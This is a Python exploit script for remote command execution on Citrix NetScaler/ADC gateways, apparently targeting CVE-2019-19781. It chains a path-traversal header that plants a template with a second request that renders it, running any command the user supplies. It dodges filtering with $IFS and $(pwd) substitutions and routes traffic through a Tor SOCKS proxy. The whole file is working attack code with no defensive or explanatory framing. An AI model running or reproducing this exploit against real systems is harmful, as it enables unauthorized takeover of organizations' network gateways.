
import requests
import urllib3
import time
import argparse
import sys
import json



urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # disable warnings


white = "\033[1;37;40m"
red = white+"["+"\033[1;31;40m"+"-"+white+"]"
green = white+"["+"\033[1;32;40m"+"+"+white+"]"
blue = white+"["+"\033[1;34;40m"+"*"+white+"]"


def parseCmd(cmd):
    # format final payload
    newCmd = cmd.replace(" ", '\$IFS')
    newCmd = newCmd.replace("/", '\$(pwd)')
    return newCmd



def exploit(victimip, victimport,cmd,v):

    proxies = { "http" : "socks5://127.0.0.1:9050",
                "https" : "socks5://127.0.0.1:9050"}

    payload = parseCmd(cmd)

    if(v):
        print(blue+" Payload = %s" % payload)
    headers = (
            {
                'User-Agent' : 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:71.0) Gecko/20100101 Firefox/71.0',
                'NSC_USER': '../../../../netscaler/portal/templates/mehh[%template.new({\'BLOCK\'=\'print`',
                'NSC_NONCE' : 'mehh'
            })

    # Little trick to avoid auto escape from python
    tmp = headers['NSC_USER']
    tmp += payload
    tmp += '`\'})%]'
    headers['NSC_USER'] = tmp

    # add support for port 80
    if victimport == ("80"):
        url = ("http://%s:%s/vpn/../vpns/portal/scripts/picktheme.pl" % (victimip, victimport))
    else:
        url = ("https://%s:%s/vpn/../vpns/portal/scripts/picktheme.pl" % (victimip, victimport))

    try:
        # REQ 1
        if(v):
            print(blue+" Headers :\n %s" % json.dumps(headers,sort_keys=True, indent=4))
            print(blue + " Url : %s" % url)
        with requests.Session() as s:
            r = requests.Request(method='GET', url=url, headers=headers)
            prep = r.prepare()
            prep.url = url
            req = s.send(prep, verify=False, proxies=proxies)


    except requests.ReadTimeout:
        print(red+" ReadTimeout: Server %s timed out and didn't respond on port: %s." % (victimip, victimport))
        sys.exit(1)
    except requests.ConnectTimeout:
        print(red+" ConnectTimeout: Server %s did not respond to a web request or the port (%s) is not open." % (victimip, victimport))
        sys.exit(1)
    except requests.ConnectionError:
        print(red+" ConnectionError: Server %s did not respond to a web request or the port (%s) is not open." % (victimip, victimport))
        sys.exit(1)

    if (req.status_code == 200):
        print(green+" First request worked")
        print(blue+" Waiting 2sec")
        time.sleep(2)
    else:
        print(blue+" Error code : %s" % req.status_code)
        print(red+" First GET request didn't work :'(")
        sys.exit(1)

    try:
        # REQ 2
        if victimport == ("80"):
            url = 'http://{}:{}'.format(victimip, victimport)
        else:
            url = 'https://{}:{}'.format(victimip, victimport)

        url += "/vpn/../vpns/portal/mehh[%25template.new({'BLOCK'='print`"
        url += payload
        url += "`'})%25].xml"

        if(v):
            print(blue+" Url2 : %s" % url)
            # print(blue+" Headers : %s" % json.dumps(headers,sort_keys=True, indent=4))
        with requests.Session() as s:
            r = requests.Request(method='GET', url=url, headers=headers)
            prep = r.prepare()
            prep.url = url
            req = s.send(prep, verify=False, proxies=proxies)
        print(green+" RCE \o/")
        print("-->")
        print(req.text)
        print(white+"========================================================")

    except requests.ReadTimeout:
        print(red+" ReadTimeout: Server %s timed out and didn't respond on port: %s." % (victimip, victimport))
        sys.exit(1)
    except requests.ConnectTimeout:
        print(red+" ConnectTimeout: Server %s did not respond to a web request or the port (%s) is not open." % (victimip, victimport))
        sys.exit(1)
    except requests.ConnectionError:
        print(red+" ConnectionError: Server %s did not respond to a web request or the port (%s) is not open." % (victimip, victimport))
        sys.exit(1)



def main():
    # parse our commands
    parser = argparse.ArgumentParser()
    parser.add_argument("target", help="the vulnerable server with Citrix hostname or IP (defaults https)")
    parser.add_argument("targetport", help="the target server web port (normally on 443)")
    parser.add_argument("cmd", help="Command to execute")
    parser.add_argument("-v", default=False, action='store_true', help="verbose")

    args = parser.parse_args()

    try:
        # Print cmd for izy loot
        print(sys.argv[0]+" "+sys.argv[1]+" "+sys.argv[2])
        exploit(args.target, args.targetport, args.cmd,args.v)
        sys.exit()

    except KeyboardInterrupt:
        print(blue+" Control-C detected, exiting ...")
        sys.exit()


if __name__ == "__main__":
    main()
